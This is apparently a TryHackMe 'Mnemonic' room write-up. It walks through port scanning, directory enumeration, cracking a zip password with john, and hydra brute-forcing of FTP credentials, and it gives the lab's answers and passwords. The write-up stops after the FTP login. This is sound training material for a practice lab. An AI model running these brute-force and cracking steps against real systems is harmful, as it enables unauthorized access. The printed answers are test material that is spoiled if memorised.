May 10, 2025<br>
Day 369<br>

![image](https://github.com/user-attachments/assets/b9685fff-7fb0-4c80-bc24-0057ea686289)


<h1>Mnemonic</h1>

https://tryhackme.com/room/mnemonic<br>

<br>
<br>

![image](https://github.com/user-attachments/assets/b3d9f441-f92c-4d5c-b68e-2d5d25456004)

<br>
<br>

<h2>Task 1 . Mnemonic</h2>

<h3>Hit me!</h3>
<p>You need 1 things : hurry up<br>
https://www.youtube.com/watch?v=pBSR3DyobIY</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 1.1. <em>-</em><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code><br>

<br>
<br>

<h2>Task 2 . Enumerate</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 2.1. <em>How many open ports?</em><a id='2.1'></a>
>> <code><strong>3</strong></code><br>


<br>

> 2.2. <em>what is the ssh port number?</em><a id='2.2'></a>
>> <code><strong>1337</strong></code><br>

<br>


<h3 align="center">$$\textcolor{white}{\textnormal{Nmap}}$$</h3>

<p align="center">There are have 3 ports open: <code>21/ftp</code>, <code>80/http</code> and <code>1337/ssh</code>. </p>

```bash
nmap -sC -sV -Pn -p- -T4 TargetIP
...
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html)
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
```

<br>
<br>

> 2.3. <em>what is the name of the secret file?</em><a id='2.3'></a>
>> <code><strong>backups.zip</strong></code><br>

<br>



<h3 align="center">$$\textcolor{white}{\textnormal{http://TargetIP}}$$</h3>
<p align="center"><code>Test</code></p>


![image](https://github.com/user-attachments/assets/9cf02354-efcf-430e-9edd-15a53962d9cd)

<br>

<h3 align="center">$$\textcolor{white}{\textnormal{http://TargetIP/robots.txt}}$$</h3>

![image](https://github.com/user-attachments/assets/a58d7b7e-5495-4542-abb5-55ac60c0a747)

<br>

```bash
:~# gobuster dir -u http://TargetIP/webmasters/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 403 -t 100
...
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin/               (Status: 200) [Size: 0]
/backups/             (Status: 200) [Size: 0]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```


<br>

```bash
:~# gobuster dir -u http://TargetIP/webmasters/backups/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x php,html,zip,tar,gz,back.old,js,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TargetIP/webmasters/backups/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              back.old,js,txt,php,html,zip,tar,gz
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
...
/backups.zip          (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 0]
/index.html           (Status: 200) [Size: 0]
```

<br>
<br>

<h2>Task 3 . Credentials</h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 3.1. <em>ftp user name?</em><a id='3.1'></a>
>> <code><strong>ftpuser</strong></code><br>



![image](https://github.com/user-attachments/assets/e4cdd597-d5f3-4635-87a5-4fe269bfc372)

<br>


```bash
:~# file backups.zip
backups.zip: Zip archive data, at least v1.0 to extract
:~# unzip backups.zip
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password:
...
:~# zip2john backups.zip > hash
ver 1.0 backups.zip/backups/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backups.zip/backups/note.txt PKZIP Encr: 2b chk, TS_chk, cmplen=67, decmplen=60, crc=AEE718A8 type=8
:~# cat hash
backups.zip/backups/note.txt:$pkzip2$1*2*2*0*43*3c*aee718a8*42*4a*8*43*aee7*24e2*2918f93964f9ffa39d4a5fc0d589cae4222fd228a12bc6459bf7b383bdc3cd74557af7a16783ba3217388d2db639162dcee0456f5264bb1839b0f63a28de19581bda79*$/pkzip2$:backups/note.txt:backups.zip::backups.zip
:~# john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)
...
Session completed. 
:~# unzip backups.zip
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password: 
  inflating: backups/note.txt
:~# cd backups
:~/backups# ls
note.txt
:~/backups# cat note.txt
@vill

James new ftp username: ftpuser
we have to work hard
:~/backups# 
```

<br>

> 3.2. <em>ftp password?</em><a id='3.2'></a>
>> <code><strong>love4ever</strong></code><br>

<br>

```bash
:~/backups# hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://TargetIP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-10 03:05:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://TargetIP:21/
[STATUS] 222.00 tries/min, 222 tries in 00:01h, 14344176 to do in 1076:54h, 16 active
[STATUS] 250.33 tries/min, 751 tries in 00:03h, 14343647 to do in 954:59h, 16 active
[21][ftp] host: TargetIP   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
...
```

<br>

> 3.3. <em>ftp password?</em><a id='3.3'></a>
>> <code><strong>love4ever</strong></code><br>

<br>

```bash
:~/backups# ftp TargetIP
...
Name (TargetIP:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------   12 1003     1003         4096 Jul 14  2020 .
drwx------   12 1003     1003         4096 Jul 14  2020 ..
lrwxrwxrwx    1 1003     1003            9 Jul 14  2020 .bash_history -> /dev/null
-rw-r--r--    1 1003     1003          220 Jul 13  2020 .bash_logout
-rw-r--r--    1 1003     1003         3771 Jul 13  2020 .bashrc
-rw-r--r--    1 1003     1003          807 Jul 13  2020 .profile
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-1
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-10
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-2
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-3
drwxr-xr-x    4 0        0            4096 Jul 14  2020 data-4
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-5
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-6
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-7
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-8
drwxr-xr-x    2 0        0            4096 Jul 13  2020 data-9
226 Directory send OK.
ftp> 


```

<br>

![image](https://github.com/user-attachments/assets/ce4e1871-0064-49af-aaa9-848b7ad501d2)

<br>

![image](https://github.com/user-attachments/assets/2e5435f8-7fa6-462d-9ad0-0d8a88512e47)

<br>

![image](https://github.com/user-attachments/assets/7eb9ffbe-0965-4537-8cd0-fe19aa989463)

<br>

![image](https://github.com/user-attachments/assets/acff34b3-5d1f-476e-9d38-fe1cb25bc09f)

<br>

![image](https://github.com/user-attachments/assets/6e3bcec3-8df8-427e-84eb-6309755f7700)

<br>

![image](https://github.com/user-attachments/assets/835ee8f7-4d44-44dc-82b1-36528e599d6d)







